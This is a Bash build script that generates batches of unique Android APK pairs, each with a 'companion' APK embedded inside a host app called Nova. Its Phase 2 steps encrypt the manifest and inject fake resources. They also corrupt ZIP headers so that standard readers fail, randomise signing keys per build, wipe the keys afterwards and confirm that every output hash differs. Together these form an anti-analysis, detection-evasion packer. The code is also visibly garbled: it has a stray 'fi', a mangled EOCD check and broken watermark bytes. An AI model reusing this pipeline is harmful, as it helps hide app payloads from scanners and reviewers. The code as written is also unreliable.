#!/usr/bin/env bash
# =============================================================================
# generate_batch.sh — Steps 9 / 11 / 18 / 17A-17H / 22
# Usage: ./generate_batch.sh <N>
# Generates N unique companion+Nova APK pairs.
# Output: batch_output/001/, batch_output/002/, ...
#
# Full per-step tracking: every phase and every step writes to
#   batch_output/<IDX>/step_audit.log
# with timestamp, exit code, APK size before/after, and full stderr.
# A final batch_output/batch_audit_summary.log collects all pair results.
# =============================================================================

set -uo pipefail

# ── Validate argument ─────────────────────────────────────────────────────────
if [ $# -lt 1 ]; then
    echo "Usage: ./generate_batch.sh <N>"
    echo "Example: ./generate_batch.sh 10"
    exit 1
fi

N=$1
if ! [[ "$N" =~ ^[0-9]+$ ]] || [ "$N" -lt 1 ]; then
    echo "[ERROR] N must be a positive integer"
    exit 1
fi

# ── Paths ─────────────────────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(dirname "$SCRIPT_DIR")"
BATCH_OUT="${REPO_ROOT}/batch_output"

echo "============================================="
echo " Batch APK Generator — ${N} pair(s)"
echo " Repo  : ${REPO_ROOT}"
echo " Output: ${BATCH_OUT}"
echo "============================================="

rm -rf "${BATCH_OUT}"
mkdir -p "${BATCH_OUT}"

INTEGRITY_LOG="${BATCH_OUT}/integrity.log"
SUMMARY_LOG="${BATCH_OUT}/batch_audit_summary.log"

echo "BATCH_SIZE=${N}"                          > "${INTEGRITY_LOG}"
echo "GENERATED_AT=$(date '+%Y%m%d_%H%M%S')"  >> "${INTEGRITY_LOG}"
echo "---"                                     >> "${INTEGRITY_LOG}"

{
    echo "========================================"
    echo " BATCH AUDIT SUMMARY"
    echo " Generated : $(date '+%Y-%m-%d %H:%M:%S')"
    echo " Pairs     : ${N}"
    echo "========================================"
} > "${SUMMARY_LOG}"

declare -A SEEN_MD5
declare -A SEEN_SHA256

apk_md5()    { md5sum    "$1" | awk '{print $1}'; }
apk_sha256() { sha256sum "$1" | awk '{print $1}'; }
apk_size()   { [ -f "$1" ] && du -b "$1" | awk '{print $1}' || echo "0"; }
pad()        { printf "%03d" "$1"; }
now()        { date '+%Y-%m-%d %H:%M:%S'; }

FAILED=0
SUCCESS=0

# ── Step tracker ──────────────────────────────────────────────────────────────
# Usage: track_step <AUDIT_LOG> <PHASE> <STEP_ID> <STEP_NAME> <APK_PATH_OR_-> <CMD...>
# Runs CMD, captures exit code + stderr, logs everything.
# Returns 0 on success, 1 on failure.
track_step() {
    local AUDIT_LOG="$1"; shift
    local PHASE="$1";     shift
    local STEP_ID="$1";   shift
    local STEP_NAME="$1"; shift
    local APK="$1";       shift
    # Remaining args = command to run

    local SIZE_BEFORE="-"
    [ -f "${APK}" ] && SIZE_BEFORE="$(apk_size "${APK}") bytes"

    local TMPSTDERR
    TMPSTDERR=$(mktemp)

    local START_TS
    START_TS=$(now)

    # Run the command, capture stderr separately, let stdout flow to terminal
    "$@" 2>"${TMPSTDERR}"
    local EXIT_CODE=$?

    local END_TS
    END_TS=$(now)

    local SIZE_AFTER="-"
    [ -f "${APK}" ] && SIZE_AFTER="$(apk_size "${APK}") bytes"

    local STATUS="✅ PASS"
    [ "${EXIT_CODE}" -ne 0 ] && STATUS="❌ FAIL"

    local STDERR_CONTENT
    STDERR_CONTENT=$(cat "${TMPSTDERR}")
    rm -f "${TMPSTDERR}"

    {
        echo "────────────────────────────────────────────────────────"
        echo "  Phase    : ${PHASE}"
        echo "  Step     : ${STEP_ID} — ${STEP_NAME}"
        echo "  Status   : ${STATUS}  (exit code: ${EXIT_CODE})"
        echo "  Started  : ${START_TS}"
        echo "  Ended    : ${END_TS}"
        echo "  APK size : before=${SIZE_BEFORE}  after=${SIZE_AFTER}"
        if [ -n "${STDERR_CONTENT}" ]; then
            echo "  STDERR   :"
            echo "${STDERR_CONTENT}" | sed 's/^/             /'
        fi
    } | tee -a "${AUDIT_LOG}"

    if [ "${EXIT_CODE}" -ne 0 ]; then
        echo "  [${STEP_ID}] ❌ FAILED — ${STEP_NAME}" | tee -a "${AUDIT_LOG}"
        return 1
    else
        echo "  [${STEP_ID}] ✅ OK — ${STEP_NAME}" | tee -a "${AUDIT_LOG}"
        return 0
    fi
}

# ── Signing tracker ───────────────────────────────────────────────────────────
# Runs apksigner sign + apksigner verify and logs full output.
track_sign() {
    local AUDIT_LOG="$1"
    local APK="$2"
    local KS_FILE="$3"
    local KS_PASS="$4"
    local KS_ALIAS="$5"

    local SIZE_BEFORE
    SIZE_BEFORE=$(apk_size "${APK}")

    local SIGNED_TMP="${APK%.apk}_resigned.apk"
    local SIGN_OUT SIGN_ERR SIGN_RC
    local TMPOUT TMPERR
    TMPOUT=$(mktemp)
    TMPERR=$(mktemp)

    {
        echo "────────────────────────────────────────────────────────"
        echo "  Phase    : SIGNING"
        echo "  Step     : RESIGN — apksigner sign"
        echo "  APK      : $(basename "${APK}")"
        echo "  KS_FILE  : ${KS_FILE}"
        echo "  KS_ALIAS : ${KS_ALIAS}"
        echo "  Started  : $(now)"
    } | tee -a "${AUDIT_LOG}"

    apksigner sign \
        --ks "${KS_FILE}" \
        --ks-pass "pass:${KS_PASS}" \
        --ks-key-alias "${KS_ALIAS}" \
        --key-pass "pass:${KS_PASS}" \
        --out "${SIGNED_TMP}" \
        "${APK}" \
        >"${TMPOUT}" 2>"${TMPERR}"
    SIGN_RC=$?

    SIGN_OUT=$(cat "${TMPOUT}")
    SIGN_ERR=$(cat "${TMPERR}")
    rm -f "${TMPOUT}" "${TMPERR}"

    {
        echo "  Sign exit code : ${SIGN_RC}"
        [ -n "${SIGN_OUT}" ] && echo "  Sign stdout    : ${SIGN_OUT}"
        [ -n "${SIGN_ERR}" ] && echo "  Sign stderr    : ${SIGN_ERR}"
    } | tee -a "${AUDIT_LOG}"

    if [ "${SIGN_RC}" -ne 0 ] || [ ! -f "${SIGNED_TMP}" ]; then
        echo "  [RESIGN] ❌ FAILED — apksigner sign failed (rc=${SIGN_RC})" | tee -a "${AUDIT_LOG}"
        rm -f "${SIGNED_TMP}"
        return 1
    fi

    mv "${SIGNED_TMP}" "${APK}"
    local SIZE_AFTER
    SIZE_AFTER=$(apk_size "${APK}")

    {
        echo "  APK size : before=${SIZE_BEFORE} bytes  after=${SIZE_AFTER} bytes"
        echo "  Ended    : $(now)"
    } | tee -a "${AUDIT_LOG}"

    # ── Verify signature ──────────────────────────────────────────────────────
    local VERIFY_OUT VERIFY_RC
    VERIFY_OUT=$(apksigner verify --verbose "${APK}" 2>&1)
    VERIFY_RC=$?

    {
        echo "  ── apksigner verify ─────────────────────────────────"
        echo "  Verify exit code : ${VERIFY_RC}"
        echo "${VERIFY_OUT}" | sed 's/^/  /'
    } | tee -a "${AUDIT_LOG}"

    if echo "${VERIFY_OUT}" | grep -q "Verified using v2"; then
        echo "  [RESIGN] ✅ OK — V2 signature verified" | tee -a "${AUDIT_LOG}"
        return 0
    else
        echo "  [RESIGN] ❌ FAILED — V2 signature NOT verified" | tee -a "${AUDIT_LOG}"
        return 1
    fi
}

# ── Step 21: ZIP comment watermark injector ──────────────────────────────────
# Runs AFTER apksigner resign+verify — safe to modify EOCD comment here
# because no further signing will happen after this point.
inject_watermark() {
    local APK="$1"
    local AUDIT_LOG="$2"

    python3 - << 'PYEOF'
import sys, struct, secrets, os
import hmac, hashlib

apk_path = sys.argv[1] if len(sys.argv) > 1 else ""
if not apk_path or not os.path.isfile(apk_path):
    print("[watermark] ⚠️  APK not found — skipping")
    sys.exit(0)

with open(apk_path, 'rb') as f:
    data = bytearray(f.read())

# Find EOCD
eocd_off = -1
for i in range(len(data) - 22, max(len(data) - 65536, -1), -1):
    if data[i:i+4] == b'PK':
        eocd_off = i
        break
if eocd_off < 0:
    print("[watermark] ⚠️  EOCD not found")
    sys.exit(0)

# Generate 64-byte watermark
salt      = secrets.token_bytes(32)
uuid_b    = secrets.token_bytes(16)
now_ms    = int(__import__('time').time() * 1000)
ts        = now_ms.to_bytes(8, 'big')
mac       = hmac.new(salt, uuid_b + ts, hashlib.sha256).digest()
watermark = b'Þ­ÀÞ' + ts + uuid_b + mac + salt[:4]  # 64 bytes

# Strip any existing comment
existing_len = struct.unpack_from('<H', data, eocd_off + 20)[0]
new_data = data[:eocd_off + 22] + watermark
struct.pack_into('<H', new_data, eocd_off + 20, len(watermark))

with open(apk_path, 'wb') as f:
    f.write(new_data)

print(f"[watermark] ✅ Step 21 — watermark injected ({len(watermark)} bytes) into EOCD comment")
print(f"[watermark]    {watermark.hex()[:32]}...")
PYEOF
    local rc=$?
    local status="✅ PASS"
    [ $rc -ne 0 ] && status="❌ FAIL"
    {
        echo "────────────────────────────────────────────────────────"
        echo "  Phase    : PHASE_2"
        echo "  Step     : STEP_21_WATERMARK — ZIP comment watermark injection [Step 21]"
        echo "  Status   : ${status}  (rc=${rc})"
    } | tee -a "${AUDIT_LOG}"
}

# ── Helper: derive per-build AES key ─────────────────────────────────────────
gen_aes_key() {
    python3 -c "import hashlib,secrets; s=secrets.token_hex(16); print(hashlib.sha256(s.encode()).hexdigest())"
}

# ── Helper: Phase 2 post-processing with per-step tracking ───────────────────
phase2_postprocess() {
    local APK="$1"
    local AES_KEY="$2"
    local LABEL="$3"
    local AUDIT_LOG="$4"

    echo "" | tee -a "${AUDIT_LOG}"
    echo "  ══ PHASE 2 POST-PROCESSING [${LABEL}] ══" | tee -a "${AUDIT_LOG}"

    # ORDER IS CRITICAL: 17D/17E/17F → 17H → 17A/17B/17C
    # 17H uses Python zipfile — must run BEFORE 17A/17B/17C which injects
    # compression type 0x07F0 (2032) that Python zipfile cannot read back.

    # Step 17D/17E/17F — manifest patcher
    if [ -f "${SCRIPT_DIR}/manifest_zip_patcher.py" ]; then
        track_step "${AUDIT_LOG}" "PHASE_2" "STEP_17DEF" \
            "Manifest AES encrypt + fake blocks + padding [17D/17E/17F]" \
            "${APK}" \
            bash -c "python3 '${SCRIPT_DIR}/manifest_zip_patcher.py' '${APK}' '${APK}.mzp' '${AES_KEY}' && mv '${APK}.mzp' '${APK}'"
    else
        echo "  [STEP_17DEF] ⚠️  SKIP — manifest_zip_patcher.py not found" | tee -a "${AUDIT_LOG}"
    fi

    # Step 17H — fake string resources (MUST be before 17ABC)
    if [ -f "${SCRIPT_DIR}/res_renamer.py" ]; then
        track_step "${AUDIT_LOG}" "PHASE_2" "STEP_17H" \
            "Fake string resources injection [17H]" \
            "${APK}" \
            bash -c "python3 '${SCRIPT_DIR}/res_renamer.py' '${APK}' '${APK}.rr' --count 30 && mv '${APK}.rr' '${APK}'"
    else
        echo "  [STEP_17H] ⚠️  SKIP — res_renamer.py not found" | tee -a "${AUDIT_LOG}"
    fi

    # Step 17A/17B/17C — ZIP header obfuscator (MUST be last — breaks zipfile readers)
    if [ -f "${SCRIPT_DIR}/zip_header_obfuscator.py" ]; then
        track_step "${AUDIT_LOG}" "PHASE_2" "STEP_17ABC" \
            "ZIP timestamp + compression 2032 + size padding [17A/17B/17C]" \
            "${APK}" \
            bash -c "python3 '${SCRIPT_DIR}/zip_header_obfuscator.py' '${APK}' '${APK}.zho' && mv '${APK}.zho' '${APK}'"
    else
        echo "  [STEP_17ABC] ⚠️  SKIP — zip_header_obfuscator.py not found" | tee -a "${AUDIT_LOG}"
    fi
    fi

    echo "  ══ PHASE 2 POST-PROCESSING [${LABEL}] DONE ══" | tee -a "${AUDIT_LOG}"
}

# ── Build loop ────────────────────────────────────────────────────────────────
for i in $(seq 1 "$N"); do
    IDX=$(pad "$i")
    PAIR_DIR="${BATCH_OUT}/${IDX}"
    mkdir -p "${PAIR_DIR}"

    AUDIT_LOG="${PAIR_DIR}/step_audit.log"

    {
        echo "========================================"
        echo " PAIR ${IDX} — STEP AUDIT LOG"
        echo " Started : $(now)"
        echo "========================================"
    } > "${AUDIT_LOG}"

    echo ""
    echo "─────────────────────────────────────────────"
    echo " Building pair ${IDX} / $(pad $N)"
    echo " Audit log: ${AUDIT_LOG}"
    echo "─────────────────────────────────────────────"

    cd "${REPO_ROOT}"
    AES_KEY=$(gen_aes_key)
    PAIR_STATUS="OK"

    # ════════════════════════════════════════════════════════════════════════
    # PHASE 1 — COMPANION BUILD (build_module.py)
    # ════════════════════════════════════════════════════════════════════════
    echo "" | tee -a "${AUDIT_LOG}"
    echo "  ══ PHASE 1 — COMPANION BUILD ══" | tee -a "${AUDIT_LOG}"

    BUILD_LOG="${PAIR_DIR}/companion_build.log"

    COMPANION_AUDIT_LOG="${PAIR_DIR}/companion_audit.log"
    export COMPANION_AUDIT_LOG

    track_step "${AUDIT_LOG}" "PHASE_1" "STEP_1-17_COMPANION" \
        "Companion full build (steps 1-17: keystore+fingerprint+res+dex+sign+unicode+noise+manifest)" \
        "-" \
        bash -c "COMPANION_AUDIT_LOG='${COMPANION_AUDIT_LOG}' python3 '${SCRIPT_DIR}/build_module.py' 2>&1 | tee '${BUILD_LOG}'; exit \${PIPESTATUS[0]}"

    if [ $? -ne 0 ]; then
        echo "  ❌ COMPANION BUILD FAILED — aborting pair ${IDX}" | tee -a "${AUDIT_LOG}"
        echo "PAIR_${IDX}=COMPANION_BUILD_FAILED" >> "${INTEGRITY_LOG}"
        echo "PAIR_${IDX} | COMPANION_BUILD_FAILED | $(now)" >> "${SUMMARY_LOG}"
        FAILED=$((FAILED + 1))
        PAIR_STATUS="COMPANION_BUILD_FAILED"
        continue
    fi

    # ════════════════════════════════════════════════════════════════════════
    # PHASE 1 — NOVA GRADLE BUILD
    # ════════════════════════════════════════════════════════════════════════
    echo "" | tee -a "${AUDIT_LOG}"
    echo "  ══ PHASE 1 — NOVA GRADLE BUILD ══" | tee -a "${AUDIT_LOG}"

    NOVA_BUILD_LOG="${PAIR_DIR}/nova_build.log"

    # Ensure gradlew is executable — git checkout does not preserve +x
    track_step "${AUDIT_LOG}" "PHASE_1" "STEP_GRADLEW_CHMOD" \
        "Ensure gradlew has execute permission" \
        "-" \
        chmod +x "${REPO_ROOT}/gradlew"

    track_step "${AUDIT_LOG}" "PHASE_1" "STEP_GRADLE_CLEAN" \
        "Gradle clean" \
        "-" \
        bash -c "./gradlew clean --quiet --no-daemon 2>&1 | tee -a '${NOVA_BUILD_LOG}'; exit \${PIPESTATUS[0]}"

    track_step "${AUDIT_LOG}" "PHASE_1" "STEP_GRADLE_ASSEMBLE" \
        "Gradle assembleRelease (keystore+fingerprint+versionRandom+resRename+watermark)" \
        "-" \
        bash -c "./gradlew assembleRelease --no-daemon 2>&1 | tee '${NOVA_BUILD_LOG}'; exit \${PIPESTATUS[0]}"

    if [ $? -ne 0 ]; then
        echo "  ❌ NOVA GRADLE BUILD FAILED — aborting pair ${IDX}" | tee -a "${AUDIT_LOG}"
        echo "PAIR_${IDX}=NOVA_GRADLE_FAILED" >> "${INTEGRITY_LOG}"
        echo "PAIR_${IDX} | NOVA_GRADLE_FAILED | $(now)" >> "${SUMMARY_LOG}"
        FAILED=$((FAILED + 1))
        PAIR_STATUS="NOVA_GRADLE_FAILED"
        continue
    fi

    # ── Find Nova APK ─────────────────────────────────────────────────────
    NOVA_APK=$(find "${REPO_ROOT}/app/build/outputs/apk/release" -name "*.apk" | head -1)
    if [ -z "${NOVA_APK}" ] || [ ! -f "${NOVA_APK}" ]; then
        echo "  ❌ Nova APK not found after Gradle build" | tee -a "${AUDIT_LOG}"
        echo "PAIR_${IDX}=NO_APK" >> "${INTEGRITY_LOG}"
        echo "PAIR_${IDX} | NO_APK | $(now)" >> "${SUMMARY_LOG}"
        FAILED=$((FAILED + 1))
        continue
    fi

    {
        echo "  Nova APK  : $(basename "${NOVA_APK}")"
        echo "  APK size  : $(apk_size "${NOVA_APK}") bytes"
        echo "  APK md5   : $(apk_md5 "${NOVA_APK}")"
    } | tee -a "${AUDIT_LOG}"

    # ════════════════════════════════════════════════════════════════════════
    # PHASE 2 — NOVA APK STRUCTURE TRICKS
    # ════════════════════════════════════════════════════════════════════════
    echo "" | tee -a "${AUDIT_LOG}"
    echo "  ══ PHASE 2 — NOVA APK STRUCTURE ══" | tee -a "${AUDIT_LOG}"

    # Step 18 — unicode folder nesting
    BUILD_HASH=$(python3 -c "import hashlib; print(hashlib.sha256('${IDX}'.encode()).hexdigest())")
    track_step "${AUDIT_LOG}" "PHASE_2" "STEP_18" \
        "Nova deep unicode folder nesting [Step 18]" \
        "${NOVA_APK}" \
        bash -c "python3 - << 'PYEOF'
import sys
sys.path.insert(0, '${SCRIPT_DIR}')
from build_module import step_nova_unicode_nest
step_nova_unicode_nest('${NOVA_APK}', '${BUILD_HASH}')
PYEOF"

    # Step 22 — zipalign randomization
    ALIGN=$(python3 -c "import random; print(random.choice([4, 8]))")
    NOVA_APK_ALIGNED="${NOVA_APK%.apk}_aligned.apk"
    track_step "${AUDIT_LOG}" "PHASE_2" "STEP_22" \
        "APK alignment randomization alignment=${ALIGN} [Step 22]" \
        "${NOVA_APK}" \
        bash -c "zipalign -f '${ALIGN}' '${NOVA_APK}' '${NOVA_APK_ALIGNED}' && mv '${NOVA_APK_ALIGNED}' '${NOVA_APK}'"

    # Steps 17A-17H via phase2_postprocess
    phase2_postprocess "${NOVA_APK}" "${AES_KEY}" "NOVA" "${AUDIT_LOG}"

    # ════════════════════════════════════════════════════════════════════════
    # SIGNING — Re-sign Nova after all post-processing
    # ════════════════════════════════════════════════════════════════════════
    echo "" | tee -a "${AUDIT_LOG}"
    echo "  ══ SIGNING — RE-SIGN NOVA APK ══" | tee -a "${AUDIT_LOG}"

    CREDS_FILE=$(find "${REPO_ROOT}/app/build/keystore" -name "ks_creds_*.properties" 2>/dev/null | head -1)

    if [ -z "${CREDS_FILE}" ] || [ ! -f "${CREDS_FILE}" ]; then
        echo "  [RESIGN] ❌ FAILED — ks_creds_*.properties not found" | tee -a "${AUDIT_LOG}"
        echo "           Expected in: ${REPO_ROOT}/app/build/keystore/" | tee -a "${AUDIT_LOG}"
        echo "           Files present: $(ls ${REPO_ROOT}/app/build/keystore/ 2>/dev/null || echo 'directory missing')" | tee -a "${AUDIT_LOG}"
        PAIR_STATUS="RESIGN_NO_CREDS"
    else
        KS_FILE=$(grep  '^ks_file='  "${CREDS_FILE}" | cut -d'=' -f2-)
        KS_PASS=$(grep  '^ks_pass='  "${CREDS_FILE}" | cut -d'=' -f2-)
        KS_ALIAS=$(grep '^ks_alias=' "${CREDS_FILE}" | cut -d'=' -f2-)

        {
            echo "  CREDS_FILE : ${CREDS_FILE}"
            echo "  KS_FILE    : ${KS_FILE}"
            echo "  KS_ALIAS   : ${KS_ALIAS}"
            echo "  KS_FILE exists: $([ -f "${KS_FILE}" ] && echo YES || echo NO)"
        } | tee -a "${AUDIT_LOG}"

        if [ ! -f "${KS_FILE}" ]; then
            echo "  [RESIGN] ❌ FAILED — keystore .jks not found at: ${KS_FILE}" | tee -a "${AUDIT_LOG}"
            PAIR_STATUS="RESIGN_NO_JKS"
        else
            track_sign "${AUDIT_LOG}" "${NOVA_APK}" "${KS_FILE}" "${KS_PASS}" "${KS_ALIAS}"
            if [ $? -ne 0 ]; then
                PAIR_STATUS="RESIGN_FAILED"
            fi
        fi

        # Step 21 — inject watermark AFTER successful resign+verify
        inject_watermark "${NOVA_APK}" "${AUDIT_LOG}"

        # Secure wipe .jks AND creds file (3-pass) after re-sign
        python3 -c "
import os, secrets

def secure_wipe(path):
    if not path or not os.path.isfile(path):
        return
    size = os.path.getsize(path)
    if size > 0:
        with open(path, 'r+b') as f:
            for _ in range(3):
                f.seek(0); f.write(secrets.token_bytes(size)); f.flush()
    os.remove(path)
    print('[wipe] Wiped: ' + os.path.basename(path))

secure_wipe('${KS_FILE}')
secure_wipe('${CREDS_FILE}')
" 2>/dev/null | tee -a "${AUDIT_LOG}" \
            || { rm -f "${KS_FILE}" 2>/dev/null; rm -f "${CREDS_FILE}" 2>/dev/null; true; }
    fi

    # ════════════════════════════════════════════════════════════════════════
    # COPY OUTPUTS + HASHES
    # ════════════════════════════════════════════════════════════════════════
    echo "" | tee -a "${AUDIT_LOG}"
    echo "  ══ OUTPUT ══" | tee -a "${AUDIT_LOG}"

    NOVA_NAME="nova_${IDX}_$(basename "${NOVA_APK}")"
    cp "${NOVA_APK}" "${PAIR_DIR}/${NOVA_NAME}"

    MOD_APK="${REPO_ROOT}/app/src/main/assets/companion.apk"
    if [ -f "${MOD_APK}" ]; then
        cp "${MOD_APK}" "${PAIR_DIR}/companion_${IDX}.apk"
    fi

    MD5=$(apk_md5 "${PAIR_DIR}/${NOVA_NAME}")
    SHA256=$(apk_sha256 "${PAIR_DIR}/${NOVA_NAME}")
    SIZE=$(du -h "${PAIR_DIR}/${NOVA_NAME}" | cut -f1)

    {
        echo "  Output APK : ${NOVA_NAME}"
        echo "  Size       : ${SIZE}"
        echo "  MD5        : ${MD5}"
        echo "  SHA256     : ${SHA256}"
    } | tee -a "${AUDIT_LOG}"

    # Duplicate detection
    DUPE=0
    if [ -n "${SEEN_MD5[$MD5]+_}" ]; then
        echo "  [WARNING] MD5 DUPLICATE of pair ${SEEN_MD5[$MD5]}" | tee -a "${AUDIT_LOG}"
        DUPE=1
    fi
    if [ -n "${SEEN_SHA256[$SHA256]+_}" ]; then
        echo "  [WARNING] SHA256 DUPLICATE of pair ${SEEN_SHA256[$SHA256]}" | tee -a "${AUDIT_LOG}"
        DUPE=1
    fi
    SEEN_MD5[$MD5]="${IDX}"
    SEEN_SHA256[$SHA256]="${IDX}"

    {
        echo "PAIR_${IDX}_NOVA=${NOVA_NAME}"
        echo "PAIR_${IDX}_MD5=${MD5}"
        echo "PAIR_${IDX}_SHA256=${SHA256}"
        echo "PAIR_${IDX}_SIZE=${SIZE}"
        echo "PAIR_${IDX}_DUPE=${DUPE}"
        echo "PAIR_${IDX}_STATUS=${PAIR_STATUS}"
    } >> "${INTEGRITY_LOG}"

    echo "PAIR_${IDX} | ${PAIR_STATUS} | size=${SIZE} | md5=${MD5} | $(now)" >> "${SUMMARY_LOG}"

    {
        echo ""
        echo "  ══ PAIR ${IDX} COMPLETE — status=${PAIR_STATUS} ══"
        echo "  Finished : $(now)"
        echo "========================================"
    } | tee -a "${AUDIT_LOG}"

    SUCCESS=$((SUCCESS + 1))
done

# ── Final summary ─────────────────────────────────────────────────────────────
echo ""
echo "============================================="
echo " Batch Complete"
echo " Success : ${SUCCESS} / ${N}"
echo " Failed  : ${FAILED} / ${N}"
echo " Log     : ${INTEGRITY_LOG}"
echo " Audit   : ${SUMMARY_LOG}"
echo "============================================="

{
    echo "---"
    echo "TOTAL_SUCCESS=${SUCCESS}"
    echo "TOTAL_FAILED=${FAILED}"
    echo "FINISHED_AT=$(date '+%Y%m%d_%H%M%S')"
} >> "${INTEGRITY_LOG}"

{
    echo "========================================"
    echo " TOTAL SUCCESS : ${SUCCESS} / ${N}"
    echo " TOTAL FAILED  : ${FAILED} / ${N}"
    echo " FINISHED      : $(now)"
    echo "========================================"
} >> "${SUMMARY_LOG}"

if [ "${FAILED}" -gt 0 ]; then
    echo "[ERROR] ${FAILED} pair(s) failed. Check batch_output/<IDX>/step_audit.log"
    exit 1
fi

echo "✅ All ${N} pairs generated successfully"

# ── Step 11 — batch integrity check ──────────────────────────────────────────
echo ""
echo "─────────────────────────────────────────────"
echo " Running batch integrity check (Step 11)..."
echo "─────────────────────────────────────────────"
python3 "${SCRIPT_DIR}/integrity_check.py" "${BATCH_OUT}"
exit 0
